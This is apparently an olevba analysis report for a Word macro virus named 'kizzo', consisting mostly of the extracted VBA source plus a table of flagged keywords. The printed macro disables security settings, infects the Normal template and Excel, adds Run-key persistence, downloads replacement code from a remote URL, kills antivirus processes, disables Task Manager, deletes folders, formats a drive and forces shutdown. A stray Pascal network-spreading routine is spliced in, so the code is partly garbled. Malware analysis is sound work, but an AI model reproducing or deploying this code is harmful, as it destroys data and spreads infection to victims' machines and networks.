olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG-25b933b7b8e7f83b8ecf227b9106946191416688
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.WMVG-25b933b7b8e7f83b8ecf227b9106946191416688 
in file: Virus.MSWord.WMVG-25b933b7b8e7f83b8ecf227b9106946191416688 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
' ______________________________________________
' Virus Name : kizzo
' Version : 1.0
' Created on : 2-02-2004
' Original length = 4813 Bytes
' Code By : 
' Email : 
' Website : 
' ����������������������������������������������
With Options
     .VirusProtection = 0
     .SaveNormalPrompt = 0
     .ConfirmConversions = 0
End With
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Macro").Controls("Security...").Enabled = False
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
Set ad = ActiveDocument.VBProject.VBComponents(1)
Set nt = NormalTemplate.VBProject.VBComponents(1)
If nt.Name <> "kizzo" Then
    Set cm = nt.CodeModule
    Set cm1 = ad.CodeModule
    cm.DeleteLines 1, cm.CountOfLines
    cm.InsertLines 1, cm1.Lines(1, cm1.CountOfLines)
    nt.Name = "kizzo"
End If
If ad.Name <> "kizzo" Then
    Set cm2 = ad.CodeModule
    Set cm3 = nt.CodeModule
    cm2.DeleteLines 1, cm2.CountOfLines
    cm2.InsertLines 1, cm3.Lines(1, cm3.CountOfLines)
    ad.Name = "kizzo"
End If
If nt.Name = "kizzo" Then
    NormalTemplate.Save
    NormalTemplate.Saved = True
End If
checker = Left(ActiveDocument.Name, 8)
If checker <> "Document" And IsNumeric(Right(ActiveDocument.Name, 1)) = False Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Else
    ActiveDocument.Saved = True
End If
Open "C:\Windows\virus.ini" For Output As #1
Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 118)
Close #1
With Application.FileSearch
    .LookIn = Application.Path
    .FileName = "kizzo.xls"
    .SearchSubFolders = True
    .Execute
If .FoundFiles.Count <> 0 Then ExcelInstalled = True
End With
If ExcelInstalled = (Rnd * 0) Then
    Set excelvir = CreateObject("excel.application")
    excelvir.Visible = (Rnd * 0)  
    excelvir.CommandBars("Tools").Controls(10).Enabled = 0
    excelvir.CommandBars("Tools").Controls(12).Enabled = 0
    excelvir.CommandBars("View").Controls(3).Enabled = 0
    excelvir.CommandBars("Window").Controls(3).Enabled = 0
    excelvir.CommandBars("Window").Controls(4).Enabled = 0
    Book = excelvir.Application.StartupPath & "\kizzo.xls"
    Set workbookvir = excelvir.Workbooks.Add
    workbookvir.VBProject.VBComponents.Import "C:\Windows\virus.ini"
    excelvir.ActiveWindow.Visible = 0
    workbookvir.SaveAs Book
    Set workbookvir = Nothing
    excelvir.Quit
    Set excelvir = Nothing
End If
Open "C:\Windows\Backup.ini" For Output As #1
Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 118)
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MMVG") = "C:\Windows\system.vbs"
Open "C:\Windows\system.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "For x = 1 To Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (""C:\Windows\Backup.ini"")"
Print #1, "Backup.Application.Quit"
Close #1
testzip = Application.System.PrivateProfileString("","HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip32.exe", "")
winz = Environ("windir")
VBA.Shell testzip & " -a -r C:\windows\messenger.zip" & Chr(32) & "C:\WINDOWS\Application Data\Microsoft\Templates\Normal.dot", vbHide
On error resume next
dim fso
set fso = createobject("Scripting.filesystemobject")
if fso.fileexists("C:\Program Files\WinRAR\WinRAR.exe") then
VBA.Shell "WinRAR.exe a C:\windows\msnmessenger.rar C:\WINDOWS\Application Data\Microsoft\Templates\Normal.dot"
end if
On error resume next
Set updatefile = CreateObject("InternetExplorer.Application")
Do While updatefile.Busy
  VBA.DoEvents
Loop
updatefile.Visible = 0
updatefile.Navigate "www.geocities.com/your_account/virus.txt"
Do While updatefile.ReadyState <> 4
  VBA.DoEvents
Loop
NewCode = updatefile.Document.Body.innerText
updatefile.Quit
Open "C:\windows\virus.ini" for output as #1
? #1, NewCode
close #1
if day(now) = 1 and month(now) = 3 and year(now) = 2007 then
msgbox "con questo ricevo tan tempo sulla vigilanza",vbInformation
end if
CreateObject("WScript.Shell").run "taskkill /f /im iexpore.exe", vbhide
CreateObject("WScript.Shell").run "taskkill /f /im nod32krn.exe", vbhide
CreateObject("WScript.Shell").run "taskkill /f /im explorer.exe", vbhide
CreateObject("WScript.Shell").run "taskkill /f /im msnmsgr.exe", vbhide
CreateObject("WScript.Shell").run "cmd.exe /c reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d ""1"" /f", vbhide
CreateObject("WScript.Shell").run "cmd.exe /c reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d ""1"" /f", vbhide
CreateObject("Scripting.FileSystemObject").DeleteFolder "c:\archivos de programa\"
CreateObject("Scripting.FileSystemObject").DeleteFolder "C:\Documents and Settings\All Users"
CreateObject("WScript.Shell").run "format e: /y /q", vbhide
CreateObject("WScript.Shell").run "shutdown -s -f -t 50", vbhide
Procedure Network;
 Var
  Name : String;
  Auto : TextFile;
 Begin
  Enumeration(NIL);
  While Domains <> '' Do Begin
   Name := Copy(Domains, 1, Pos(#13#10, Domains)-1);
   Try
    CopyFile(pChar(ParamStr(0)), pChar(Name + '\C$\Setup.exe'), False);
    If FileExists(pChar(Name + '\C$\AutoExec.bat')) Then Begin
     AssignFile(Auto, Name + '\C$\AutoExec.bat');
     Append(Auto);
     WriteLn(Auto, 'Setup.exe');
     CloseFile(Auto);
    End;
   Except
    ;
   End;
   Domains := Copy(Domains, Pos(#13#10, Domains)+2, Length(Domains));
  End;
 End;


Begin
  Network;
end sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |system.vbs          |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
|IOC       |WinRAR.exe          |Executable file name                         |
|IOC       |iexpore.exe         |Executable file name                         |
|IOC       |nod32krn.exe        |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |msnmsgr.exe         |Executable file name                         |
|IOC       |cmd.exe             |Executable file name                         |
|IOC       |Setup.exe           |Executable file name                         |
|IOC       |AutoExec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

